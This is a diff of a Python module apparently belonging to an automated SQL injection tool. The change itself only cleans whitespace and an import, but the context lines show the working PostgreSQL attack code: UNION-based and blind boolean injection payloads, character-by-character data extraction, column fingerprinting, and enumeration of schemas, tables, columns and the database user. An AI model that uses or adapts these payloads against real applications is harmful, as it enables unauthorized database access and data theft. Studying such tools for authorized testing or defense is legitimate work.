@@ -1,28 +1,28 @@
 #!/usr/bin/python3
-# 
+#
 # This program is free software; you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
 # the Free Software Foundation; either version 3 of the License, or
 # (at your option) any later version.
-#       
+#
 # This program is distributed in the hope that it will be useful,
 # but WITHOUT ANY WARRANTY; without even the implied warranty of
 # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 # GNU General Public License for more details.
-#       
+#
 # You should have received a copy of the GNU General Public License
 # along with this program; if not, write to the Free Software
 # Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 # MA 02110-1301, USA.
 #
 # Developed by: Nasel(http://www.nasel.com.ar)
-# 
+#
 # Authors:
 # Matías Fontanini
 # Santiago Alessandri
 # Gastón Traberg
 
-from dbmsmoles import DbmsMole, FingerBase
+from . import DbmsMole, FingerBase
 
 class PostgresMole(DbmsMole):
     out_delimiter_result = "::-::"
@@ -32,50 +32,50 @@ class PostgresMole(DbmsMole):
     integer_field_finger = 'ascii(chr(58)) + (length(' + DbmsMole.chr_join("1111111") + ') * 190) + (ascii(chr(73)) * 31337)'
     integer_field_finger_result = '2288989'
     integer_out_delimiter = '3133707'
-    
+
     def to_string(self, data):
         return DbmsMole.chr_join(data)
-        
+
     def _schemas_query_info(self):
         return {
             'table' : 'pg_tables',
             'field' : 'distinct(schemaname)'
         }
-    
+
     def _tables_query_info(self, db):
         return {
             'table' : 'pg_tables',
             'field' : 'tablename',
             'filter': "schemaname = '{db}'".format(db=db)
         }
-    
+
     def _columns_query_info(self, db, table):
         return {
             'table' : 'pg_namespace,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid',
             'field' : 'attname',
             'filter': "a.relnamespace=pg_namespace.oid AND attnum>0 AND nspname='{db}' AND a.relname='{table}'".format(db=db, table=table)
         }
-        
+
     def _fields_query_info(self, fields, db, table, where):
         return {
             'table' : db + '.' + table,
             'field' : ','.join(fields),
             'filter': where
         }
-        
+
     def _dbinfo_query_info(self):
         return {
-            'field' : 'getpgusername(),version(),current_database()', 
+            'field' : 'getpgusername(),version(),current_database()',
             'table' : ''
         }
-        
+
     def forge_blind_query(self, index, value, field, table, where="1=1", offset=0):
         if table == 'pg_tables' and where == "1=1" and field == 'distinct(schemaname)':
             return ' and {op_par}' + str(value) + ' < (select distinct on(schemaname) ascii(substring(schemaname, '+str(index)+', 1)) from ' + table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset) + ')'
         else:
             return DbmsMole.forge_blind_query(self, index, value, field, table, where, offset)
-        
-        
+
+
     def forge_blind_count_query(self, operator, value, table, where="1=1"):
         if table == 'pg_tables' and where == "1=1":
             return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(distinct(schemaname)) from '+table+' where '+self.parse_condition(where)+')'
@@ -91,41 +91,41 @@ class PostgresMole(DbmsMole):
     @classmethod
     def dbms_name(cls):
         return 'Postgres'
-    
+
     @classmethod
     def blind_field_delimiter(cls):
         return PostgresMole.inner_delimiter_result
-    
+
     @classmethod
     def dbms_check_blind_query(cls):
         return ' and {op_par}0 < (select length(getpgusername()))'
-    
+
     @classmethod
     def field_finger(cls, finger):
         if finger.is_string_query:
             return DbmsMole.field_finger_str
         else:
             return PostgresMole.integer_field_finger_result
-    
+
     def is_string_query(self):
         return self.finger.is_string_query
-    
+
     def forge_count_query(self, column_count, fields, table_name, injectable_field, where = None):
         if not self.finger is None and not self.finger.is_string_query:
             return self.forge_integer_count_query(column_count, fields, table_name, injectable_field, where)
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.query)
         query_list[injectable_field] = ("(" + PostgresMole.out_delimiter + "||COUNT(" + fields + ")||" + PostgresMole.out_delimiter + ")")
-    
+
         query += ','.join(query_list)
         at_end = ''
         if len(table_name) > 0:
-            query += " from " + table_name 
+            query += " from " + table_name
         if not where is None:
             query += " where " + self.parse_condition(where)
         query += at_end
         return query
-    
+
     def forge_query(self, column_count, fields, table_name, injectable_field, where = None, offset = 0):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.query)
@@ -140,7 +140,7 @@ class PostgresMole(DbmsMole):
         query += ','.join(query_list)
         at_end = ''
         if len(table_name) > 0:
-            query += " from " + table_name 
+            query += " from " + table_name
             at_end = " limit 1 offset " + str(offset)
         if not where is None:
             query += " where " + self.parse_condition(where)
@@ -154,7 +154,7 @@ class PostgresMole(DbmsMole):
         query += ','.join(query_list)
         at_end = ''
         if len(table_name) > 0:
-            query += " from " + table_name 
+            query += " from " + table_name
         if not where is None:
             query += " where " + self.parse_condition(where)
         query += at_end
@@ -174,7 +174,7 @@ class PostgresMole(DbmsMole):
         query += ','.join(query_list)
         at_end = ''
         if len(table_name) > 0:
-            query += " from " + table_name 
+            query += " from " + table_name
             at_end = " limit 1 offset " + str(offset)
         if not where is None:
             query += " where " + self.parse_condition(where)
@@ -195,7 +195,7 @@ class PostgresMole(DbmsMole):
         query += ','.join(query_list)
         at_end = ''
         if len(table_name) > 0:
-            query += " from " + table_name 
+            query += " from " + table_name
             at_end = " limit 1 offset " + str(offset)
         if not where is None:
             query += " where " + self.parse_condition(where)
@@ -234,7 +234,7 @@ class PostgresMole(DbmsMole):
             hashes.append(str(i))
         output.append(FingerBase(list(hashes), to_search))
         return output + output_int
-    
+
     @classmethod
     def field_finger_query(cls, columns, finger, injectable_field):
         query = " and 1=0 UNION ALL SELECT "
@@ -262,6 +262,6 @@ class PostgresMole(DbmsMole):
             return None
         data = data_list[1]
         return data.split(PostgresMole.inner_delimiter_result)
-    
+
     def __str__(self):
         return "Posgresql Mole"
